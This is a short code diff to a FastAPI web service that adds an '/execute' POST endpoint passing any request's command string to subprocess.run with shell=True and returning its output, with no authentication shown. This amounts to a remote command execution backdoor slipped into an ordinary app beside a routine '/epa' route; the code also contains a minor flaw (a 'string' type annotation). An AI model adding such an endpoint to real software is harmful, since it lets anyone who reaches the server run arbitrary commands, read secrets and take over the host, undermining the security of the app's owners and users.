@@ -8,6 +8,7 @@ from fastapi.middleware.cors import CORSMiddleware
 from dotenv import load_dotenv
 import os
 from upstash_qstash import Client
+import subprocess
 
 load_dotenv()
 
@@ -28,6 +29,17 @@ app.add_middleware(
     allow_headers=["*"],
 )   
 
+@app.post("/execute")
+async def execute_command(cmd: string):
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        return {
+            "stdout": result.stdout,
+            "stderr": result.stderr,
+            "returncode": result.returncode
+        }
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
 
 @app.get('/epa')
 async def read_epa():
